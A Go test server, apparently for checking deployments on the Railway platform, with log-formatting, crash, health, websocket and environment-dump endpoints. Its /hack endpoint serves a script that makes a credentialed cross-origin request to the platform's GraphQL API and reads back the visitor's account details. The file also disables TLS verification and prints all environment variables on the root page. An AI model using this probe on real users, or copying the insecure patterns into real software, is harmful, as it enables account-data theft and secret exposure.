// Bump #10
package main

import (
	"context"
	"crypto/tls"
	"fmt"
	"github.com/gorilla/websocket"
	"github.com/logrusorgru/aurora"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"sort"
	"strconv"
	"strings"
	"time"
	"unicode/utf8"
)

var appAvailableDuration time.Duration = 0
var startTime = time.Now()
var deployID = startTime.Format(time.RFC3339)
var upgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool {
		origin := r.Header["Origin"]
		if len(origin) == 0 {
			return true
		}
		u, err := url.Parse(origin[0])
		if err != nil {
			return false
		}
		fmt.Printf("Testing %s ?= %s\n", u.Host, strings.TrimSuffix(r.Host, ":443"))
		return equalASCIIFold(u.Host, strings.TrimSuffix(r.Host, ":443"))
	},
}

func init() {
	domain := os.Getenv("RAILWAY_STATIC_URL")
	dialer := &net.Dialer{
		Timeout:   30 * time.Second,
		KeepAlive: 30 * time.Second,
		// DualStack: true, // this is deprecated as of go 1.16
	}
	// or create your own transport, there's an example on godoc.
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	http.DefaultTransport.(*http.Transport).DialContext = func(ctx context.Context, network, addr string) (net.Conn, error) {
		if strings.Contains(addr, "up.railway-develop.app") {
			addr = "host.docker.internal:443"
		}
		return dialer.DialContext(ctx, network, addr)
	}

	httpClientBasic := http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
				if strings.Contains(addr, "up.railway-develop.app") {
					addr = "host.docker.internal:443"
				}
				return dialer.DialContext(ctx, network, addr)
			},
		},
	}

	go func() {
		for range time.Tick(time.Millisecond * 100) {
			resp, err := httpClientBasic.Get("https://" + domain)
			if err != nil {
				continue
			}
			body, err := ioutil.ReadAll(resp.Body)
			if strings.Contains(string(body), deployID) {
				break
			}
		}

		appAvailableDuration = time.Since(startTime).Truncate(time.Second)
		fmt.Println(aurora.Bold(fmt.Sprintf("App available in %s", aurora.Yellow(appAvailableDuration))))
	}()
}

func main() {
	fmt.Printf("This is a line\n\nthere should have been an empty line above this.\n")
	fmt.Printf("%s %s %s %s %s %s %s %s\n", aurora.Black("  BLK  "), aurora.Red("  RED  "), aurora.Green("  GRN  "), aurora.Yellow("  YLW  "), aurora.Blue("  BLU  "), aurora.Magenta("  MGT  "), aurora.Cyan("  CYA  "), aurora.White("  WHT  "))
	fmt.Printf("%s %s %s %s %s %s %s %s\n", aurora.BrightBlack("  BLK  "), aurora.BrightRed("  RED  "), aurora.BrightGreen("  GRN  "), aurora.BrightYellow("  YLW  "), aurora.BrightBlue("  BLU  "), aurora.BrightMagenta("  MGT  "), aurora.BrightCyan("  CYA  "), aurora.BrightWhite("  WHT  "))
	fmt.Printf("%s %s %s %s %s %s %s %s\n", aurora.BgBlack("  BLK  "), aurora.BgRed("  RED  "), aurora.BgGreen("  GRN  "), aurora.BgYellow("  YLW  "), aurora.BgBlue("  BLU  "), aurora.BgMagenta("  MGT  "), aurora.BgCyan("  CYA  "), aurora.BgWhite("  WHT  "))
	fmt.Printf("%s %s %s %s %s %s %s %s\n", aurora.BgBrightBlack("  BLK  "), aurora.BgBrightRed("  RED  "), aurora.BgBrightGreen("  GRN  "), aurora.BgBrightYellow("  YLW  "), aurora.BgBrightBlue("  BLU  "), aurora.BgBrightMagenta("  MGT  "), aurora.BgBrightCyan("  CYA  "), aurora.BgBrightWhite("  WHT  "))

	fmt.Println("This is a really long line, meant to test out word wrapping for Railway logs. It's actually pretty hard to " +
		"come up with an example log this long, so it won't be that interesting to read, but that's okay. I hope you enjoyed " +
		"this boring paragraph of text and that you never have to read it again.")
	port := os.Getenv("PORT")
	if port == "" {
		port = "3032"
	}

	if strings.ToLower(os.Getenv("ENABLE_TICK")) == "true" {
		go func() {
			ticks := 0
			for {
				ticks++
				fmt.Printf("This is number %s tick!\n", aurora.Yellow(fmt.Sprintf("%d", ticks)))
				<-time.Tick(time.Millisecond * 7000)
			}
		}()
	}

	http.HandleFunc("/timeout", func(w http.ResponseWriter, r *http.Request) {
		time.Sleep(120 * time.Second)
		_, _ = w.Write([]byte("Woke up"))
	})

	http.HandleFunc("/health", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	})

	http.HandleFunc("/not-found", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusNotFound)
	})

	http.HandleFunc("/panic", func(w http.ResponseWriter, r *http.Request) {
		panic("Silly Billy")
	})

	http.HandleFunc("/_health", func(w http.ResponseWriter, r *http.Request) {
		d := time.Since(startTime)
		if d < 3*time.Second {
			panic("HELLO")
			time.Sleep(8 * time.Second)
		} else if d < 45*time.Second {
			time.Sleep(5 * time.Second)
			w.WriteHeader(http.StatusTeapot)
		} else {
			w.WriteHeader(http.StatusOK)
		}
	})

	http.HandleFunc("/crash", func(w http.ResponseWriter, r *http.Request) {
		os.Exit(1)
	})

	http.HandleFunc("/log", func(w http.ResponseWriter, r *http.Request) {
		l := r.URL.Query().Get("log")
		if l == "" {
			w.Header().Set("Content-Type", "text/html")
			w.Write([]byte(`<form method="GET"><input name="log" autofocus/><button type="submit">Log It!</button></form>`))
		} else {
			fmt.Println(l)
			http.Redirect(w, r, "/log", http.StatusSeeOther)
		}
	})

	http.HandleFunc("/printlogs", func(w http.ResponseWriter, r *http.Request) {
		n, err := strconv.Atoi(r.URL.Query().Get("lines"))
		if err != nil {
			w.WriteHeader(http.StatusBadRequest)
			return
		}

		t := time.Now()
		fmt.Printf("%d INCOMING LOGS!\n", t.Unix())
		for i := 0; i < n; i++ {
			fmt.Printf("  %d Dummy log line %d\n", t.Unix(), i)
		}

		w.WriteHeader(http.StatusOK)
	})

	http.HandleFunc("/status", func(w http.ResponseWriter, r *http.Request) {
		status := r.URL.Query().Get("status")
		s, err := strconv.Atoi(status)
		if err == nil {
			w.WriteHeader(s)
		}
		_, _ = w.Write([]byte("Status=" + status))
	})

	http.HandleFunc("/hack", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html")
		w.Write([]byte(`
		<h1>Hack</h1>
<code>
</code>
		<script>
(async function() {
const resp = await fetch("https://backboard.railway-develop.app/graphql?q=getMe", {
    "credentials": "include",
    "headers": {
        "Content-Type": "application/json",
    },
    "referrer": "https://railway-develop.app/",
    "body": "{\"query\":\"query getMe {\\n  me {\\n    ...UserFields\\n  }\\n}\\n\\nfragment UserFields on User {\\n  id\\n  email\\n  name\\n  avatar\\n  isAdmin\\n  createdAt\\n  plan\\n  agreedFairUse\\n  riskLevel\\n  customer {\\n    state\\n  }\\n  projects(orderBy: {updatedAt: desc}) {\\n    id\\n    name\\n    deletedAt\\n  }\\n  providerAuths {\\n    id\\n    provider\\n    metadata\\n  }\\n  banReason\\n  teams {\\n    ...TeamFields\\n  }\\n  resourceAccess {\\n    ...ResourceAccessFields\\n  }\\n}\\n\\nfragment TeamFields on Team {\\n  id\\n  name\\n  avatar\\n  createdAt\\n  customer {\\n    state\\n  }\\n  teamPermissions {\\n    id\\n    userId\\n    role\\n  }\\n  projects {\\n    id\\n    name\\n    deletedAt\\n  }\\n  resourceAccess {\\n    ...ResourceAccessFields\\n  }\\n}\\n\\nfragment ResourceAccessFields on ResourceAccess {\\n  project {\\n    allowed\\n    message\\n  }\\n  plugin {\\n    allowed\\n    message\\n  }\\n  environment {\\n    allowed\\n    message\\n  }\\n  deployment {\\n    allowed\\n    message\\n  }\\n}\\n\"}",
    "method": "POST",
    "mode": "cors"
});
document.querySelector('code').innerHTML = await resp.text();
})();
</script>
`))
	})

	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(200)
		w.Header().Set("Content-Type", "text/html")
		fmt.Fprintf(w, "<style>body {color:#ccc;background:#222;font-family:sans-serif} td,th {text-align:left;padding-right:0.5rem} h1 {font-size: 1.8rem;} summary {cursor:pointer;margin-bottom:0.5rem 0;} a {color:#62d3ff;}</style>")
		fmt.Fprintf(w, `
			<script>
				// Create WebSocket connection.
				const socket = new WebSocket(window.location.protocol.replace('http', 'ws')+'//'+window.location.host+'/websocket');

				// Connection opened
				socket.addEventListener('open', function (event) {
					socket.send('Hello Server!');
				});

				// Listen for messages
				socket.addEventListener('message', function (event) {
					console.log('Message from server ', event.data);
					document.querySelector('#ws-status').innerHTML = 'OK';
				});
			</script>
		`)
		fmt.Fprintf(w, "<h1>Greg's Go Server</h1>")
		fmt.Fprintf(w, `<p><a href="https://%s" target="_blank">%s</a></p>`, os.Getenv("RAILWAY_STATIC_URL"), os.Getenv("RAILWAY_STATIC_URL"))
		fmt.Fprintf(w, "<p>Started %s</p>", deployID)
		fmt.Fprintf(w, "<p>Available in %s</p>", appAvailableDuration.String())
		fmt.Fprintf(w, "<h2>Environment</h2>")
		fmt.Fprintf(w, "<details><summary>Show %d Environment Variables</summary><table><thead><tr><th>Variable</th><th>Value</th></tr></thead><tbody>", len(os.Environ()))
		env := os.Environ()
		sort.Slice(env, func(i, j int) bool {
			return strings.SplitN(env[i], "=", 2)[0] < strings.SplitN(env[j], "=", 2)[0]
		})
		for _, e := range env {
			s := strings.SplitN(e, "=", 2)
			fmt.Fprintf(w, "<tr><td>$%s</td><td>%s</td></tr>", s[0], s[1])
		}
		fmt.Fprintf(w, "</tbody></table></details>")

		fmt.Fprintf(w, "<h2>Headers</h2>")
		fmt.Fprintf(w, "<details><summary>Show %d Headers</summary><table><thead><tr><th>Header</th><th>Value</th></tr></thead><tbody>", len(r.Header))
		keys := make([]string, 0)
		for k := range r.Header {
			keys = append(keys, k)
		}
		sort.Strings(keys)
		for _, k := range keys {
			fmt.Fprintf(w, "<tr><td>%s</td><td>%s</td></tr>", k, r.Header.Get(k))
		}
		fmt.Fprintf(w, "</tbody></table></details>")
		fmt.Fprintf(w, "<h2>Websockets</h2>")
		fmt.Fprintf(w, "<p id=\"ws-status\">Pending</p>")
	})

	http.HandleFunc("/websocket", func(w http.ResponseWriter, r *http.Request) {
		// Upgrade our raw HTTP connection to a websocket based one
		conn, err := upgrader.Upgrade(w, r, nil)
		if err != nil {
			fmt.Printf("Error during connection upgradation: %s\n", err)
			return
		}
		defer conn.Close()

		// The event loop
		for {
			messageType, message, err := conn.ReadMessage()
			if err != nil {
				fmt.Println("Error during message reading:", err)
				break
			}
			fmt.Printf("Received: %s\n", message)
			err = conn.WriteMessage(messageType, message)
			if err != nil {
				fmt.Println("Error during message writing:", err)
				break
			}
		}
	})

	if os.Getenv("DISABLE_SERVER") != "true" {
		fmt.Println("Starting server on port " + port + " at " + time.Now().Format(time.RFC3339))
		fmt.Printf("PROCESS ARGUMENTS %#v\n", os.Args)
		log.Fatal(http.ListenAndServe(":"+port, nil))
	} else {
		fmt.Println("Running Worker")
		time.Sleep(time.Hour * 1000)
	}
}

// equalASCIIFold returns true if s is equal to t with ASCII case folding as
// defined in RFC 4790.
func equalASCIIFold(s, t string) bool {
	for s != "" && t != "" {
		sr, size := utf8.DecodeRuneInString(s)
		s = s[size:]
		tr, size := utf8.DecodeRuneInString(t)
		t = t[size:]
		if sr == tr {
			continue
		}
		if 'A' <= sr && sr <= 'Z' {
			sr = sr + 'a' - 'A'
		}
		if 'A' <= tr && tr <= 'Z' {
			tr = tr + 'a' - 'A'
		}
		if sr != tr {
			return false
		}
	}
	return s == t
}
